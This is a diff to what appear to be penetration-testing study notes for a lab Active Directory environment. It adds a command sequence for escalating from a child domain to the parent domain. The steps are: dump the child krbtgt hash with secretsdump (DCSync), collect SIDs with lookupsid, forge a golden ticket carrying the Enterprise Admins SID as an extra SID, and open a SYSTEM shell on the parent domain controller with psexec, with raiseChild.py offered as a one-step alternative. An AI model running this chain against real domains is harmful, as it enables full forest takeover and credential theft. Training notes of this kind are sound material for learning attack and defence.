@@ -3528,6 +3528,33 @@ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
 mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
 
+>[!check] ParentChildTrust Linux
+```
+# 1. Extract the Child Domain KRBTGT NTLM Hash via DCSync
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+
+# 2. Extract the Child Domain SID
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+# 3. Extract the Parent Domain SID and verify the Enterprise Admins RID (519)
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+
+# 4. Forge the Golden Ticket injecting the Parent Enterprise Admins SID into ExtraSids
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+# 5. Load the forged ticket into your current terminal session environment
+export KRB5CCNAME=hacker.ccache
+
+# 6. Execute lateral movement to pop a SYSTEM shell on the Parent Domain Controller
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+# ALTERNATIVE: Automate steps 1 through 6 entirely using raiseChild
+raiseChild.py -target-exec 172.16.5.5 -child-fqdn LOGISTICS.INLANEFREIGHT.LOCAL -clear-passwords INLANEFREIGHT.LOCAL/administrator
+
+```
+
+
+
 > [!example] 💾 Windows CMD: Native Assembly Forging of Persistent Active Directory Corporate Golden Tickets
 > 
 > Generates and injects a custom Golden Ticket directly into local volatile memory using Mimikatz.
